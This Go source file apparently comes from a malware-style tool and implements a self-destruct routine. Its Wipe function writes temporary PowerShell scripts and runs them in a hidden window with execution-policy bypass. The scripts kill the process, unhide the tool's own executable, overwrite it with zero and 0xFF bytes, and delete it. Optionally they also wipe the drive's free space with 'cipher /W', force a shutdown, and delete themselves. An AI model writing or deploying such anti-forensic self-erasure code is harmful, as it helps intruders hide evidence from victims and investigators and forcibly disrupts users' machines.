package core

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"radithor/store"

	"github.com/horobimasu/gotils"
)

func Wipe(cipherDrive bool) error {
	var cipherPath string

	if cipherDrive {
		cipherName := fmt.Sprintf("%dc.ps1", time.Now().UnixNano())
		cipherPath = filepath.Join(os.TempDir(), cipherName)

		var cipher strings.Builder

		fmt.Fprintf(&cipher, "cipher /W:%s\n", filepath.VolumeName(store.ExecPath))
		cipher.WriteString("shutdown /s /f /t 3\n")
		fmt.Fprintf(&cipher, "[System.IO.File]::Delete(%q)", cipherPath)

		err := os.WriteFile(cipherPath, []byte(cipher.String()), 0666)
		if err != nil {
			return err
		}
	}

	wipeName := fmt.Sprintf("%d.ps1", time.Now().UnixNano())
	wipePath := filepath.Join(os.TempDir(), wipeName)

	var wipe strings.Builder

	wipe.WriteString("sleep 1\n")
	fmt.Fprintf(&wipe, "kill -fo -id %d\n", os.Getpid())
	fmt.Fprintf(&wipe, "attrib -h -s %q\n", store.ExecPath)
	fmt.Fprintf(&wipe, "[System.IO.File]::WriteAllBytes(%q, [byte[]](0x00) * (Get-Item %q).Length)\n", store.ExecPath, store.ExecPath)
	fmt.Fprintf(&wipe, "[System.IO.File]::WriteAllBytes(%q, [byte[]](0xFF) * (Get-Item %q).Length)\n", store.ExecPath, store.ExecPath)

	if cipherDrive {
		fmt.Fprintf(&wipe, "start %q", cipherPath)
	}

	fmt.Fprintf(&wipe, "[System.IO.File]::Delete(%q)\n", store.ExecPath)

	err := os.WriteFile(wipePath, []byte(wipe.String()), 0666)
	if err != nil {
		return err
	}

	defer os.Exit(0)

	return gotils.RunCommand("powershell", "-nop", "-w", "hidden", "-ep", "bypass", "-file", wipePath)
}
